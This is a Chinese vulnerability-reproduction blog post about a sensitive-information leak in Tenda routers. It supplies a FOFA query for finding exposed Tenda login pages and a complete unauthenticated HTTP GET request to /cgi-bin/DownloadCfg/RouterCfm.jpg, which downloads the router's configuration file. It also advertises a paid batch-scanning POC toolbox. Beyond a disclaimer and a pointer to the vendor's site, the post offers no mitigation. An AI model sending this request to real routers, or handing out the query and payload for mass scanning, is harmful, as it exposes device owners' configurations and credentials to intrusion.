#  腾达Tenda 路由器存在敏感信息泄露漏洞 附POC  
2026-1-28更新
                    2026-1-28更新  南风漏洞复现文库   2026-01-28 15:23  
  
   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 腾达Tenda 路由器简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
Tenda 路由器  
## 2.漏洞描述  
  
腾达Tenda 路由器存在敏感信息泄露漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
Tenda 路由器  
![腾达Tenda 路由器存在敏感信息泄露漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3awoHVcCUzI6I1qU0vPU9TCKfIkfRs3LphibiaTGvqHKZtCsAoLlJ921x2m9FeDYShhMzqWFBKCLkMg/640?wx_fmt=png&from=appmsg "null")  
  
腾达Tenda 路由器存在敏感信息泄露漏洞  
## 4.fofa查询语句  
  
title="Tenda | Login"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/cgi-bin/DownloadCfg/RouterCfm.jpg  
  
漏洞数据包：  
```
GET /cgi-bin/DownloadCfg/RouterCfm.jpg HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awoHVcCUzI6I1qU0vPU9TCl93r5jDcb8ahibfXearBodBLjPwvfaL8lDQqPruBL3KaXoYaWWM97PA/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awoHVcCUzI6I1qU0vPU9TCoeMnssq44GWElxc1eRE8qp3GZV31EnacJYYN938ibPpNpOibJve3ic2AQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awoHVcCUzI6I1qU0vPU9TCHrDF2K01lWdOQCndGyY9UUiaA1GEbdiajciaKd245Rnb8hkuz59jEwDAg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awoHVcCUzI6I1qU0vPU9TCxcE6LQoI1qRGgcM3L4VibomFsIvJnicmgUGD0iciamyKQGo2JWxr73fyQg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awoHVcCUzI6I1qU0vPU9TCGr1ALl214u8SibA33VSwHPXGyWwslRBdPrPjGh2Fl6nze16z5g0hp2g/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awoHVcCUzI6I1qU0vPU9TCKBZl4hCBicFImMiafk0r2Yl4ECxnBu9gxciaVa8lohGc9TxuVNfuBqsMg/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
厂商尚未提供修复方案，请及时关注厂商官网更新：  
www.tenda.com.cn  
## 8.往期回顾  
  
  
   
  
  
  
